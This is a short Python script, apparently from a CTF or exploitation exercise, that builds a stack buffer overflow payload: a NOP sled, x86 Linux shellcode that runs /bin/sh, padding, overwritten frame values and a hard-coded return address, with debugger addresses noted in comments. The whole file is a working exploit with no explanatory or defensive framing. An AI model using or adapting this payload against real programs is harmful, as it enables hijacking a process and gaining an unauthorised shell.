#shcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nopnop = "\x90" * 40;
shcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
offset = "A"*12;
saveip = "\x28\xf7\xff\xbf\x4a\x85\x04\x08\x50\x85\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00";
neweip = "\xdc\xf6\xff\xbf";

#print(shcode + offset + saveip + neweip);
print(nopnop + shcode + offset + saveip + neweip);

# Buffer: 0xbffff6cc
# Ebp   : 0xbffff728	0x0804854a  0x08048550	0x00000000	0x00000000
# oldeip: 0xb7e454d3
#0xb7e453e0
